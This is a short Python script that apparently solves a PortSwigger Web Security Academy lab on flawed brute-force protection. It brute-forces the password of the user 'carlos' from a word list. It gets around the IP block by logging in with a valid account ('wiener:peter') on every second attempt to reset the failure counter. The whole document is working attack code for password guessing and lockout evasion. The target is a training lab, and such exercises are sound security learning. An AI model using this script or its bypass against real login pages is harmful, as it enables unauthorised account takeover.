# https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block


import requests


with open('passwords.txt', 'r') as f:
    passwords = f.read().splitlines()


url = 'https://....web-security-academy.net/login'
found_password = ''


for i in range(len(passwords)):

    if i % 2 == 0:
        login_body = {
            'username': 'wiener',
            'password': 'peter'
        }
        r = requests.post(url = url, data = login_body)

    login_body = {
        'username': 'carlos',
        'password': passwords[i]
    }
    r = requests.post(url = url, data = login_body)

    if 'Incorrect password' not in r.text:
        found_password = passwords[i]
        break

print('Password: ', found_password)
